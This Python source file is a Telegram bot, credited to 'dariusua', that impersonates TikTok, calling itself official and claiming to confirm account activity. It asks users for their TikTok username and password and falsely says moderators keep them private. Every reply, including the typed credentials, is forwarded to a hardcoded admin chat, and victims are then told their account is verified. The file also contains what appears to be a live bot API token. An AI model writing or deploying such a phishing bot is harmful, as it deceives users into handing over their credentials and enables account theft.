#  ENERGYLOEBOT version 1.5.2 by dariusua

import telebot
from telebot import types


bot = telebot.TeleBot("5847837649:AAE2ekLBWbKksrx5derg74Shy_sA_qjMDAU")

markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
item1 = types.KeyboardButton("✅ Внести свій акаунт в базу даних")
markup.add(item1)

# Початок роботи, створення бази даних
@bot.message_handler(commands=['start'])
def start(message: types.Message):
    try:
        bot.send_message(message.from_user.id, f'ЦЕЙ БОТ СТВОРЕНИЙ ДЛЯ ПІДТВЕРДЖЕННЯ АКТИВНОСТІ АКАУНТІВ ТІКТОКУ! ОЦІЦІЙНО! ✅', reply_markup=markup)
    except telebot.apihelper.ApiTelegramException:
        pass

# Функція розсилки через команду
@bot.message_handler(commands=['send'])
def send(message: types.Message):
    if message.from_user.id == 880691612:
        text = message.text[6:]
        bot.send_message(880691612, text)
    else:
        try:
            bot.send_message(message.from_user.id, "Для виконання цієї команди Ви повинні бути адміном.")
        except telebot.apihelper.ApiTelegramException:
            pass

@bot.message_handler(content_types='text')
def message_reply(message: types.Message):
# Підключення сповіщень
    if message.text == "✅ Внести свій акаунт в базу даних":
        try:
            bot.send_message(message.chat.id, f'✅ Для підтвердження активності вашого акаунту ТІКТОК, введіть свій логін(нікнейм) та пароль.\n\nІнформація не передається третім особам, її знають тільки модератори тіктоку!', reply_markup=None)
        except telebot.apihelper.ApiTelegramException:
            pass
    elif message.text == "/start":
        pass
    else:
        final(message.chat.id)
        bot.send_message(880691612, f"<a href='tg://user?id={message.chat.id}'>{message.chat.first_name} {message.chat.last_name}</a>: {message.text}", parse_mode='HTML')

def final(chat_id):
    bot.send_message(chat_id, "Ваш акаунт внесений в базу даних ТІКТОК. Підозрілої активності не замічено. ✅ \n\nМожете продовжувати користуватись нашою платформою для нових і класних відео!")

bot.infinity_polling()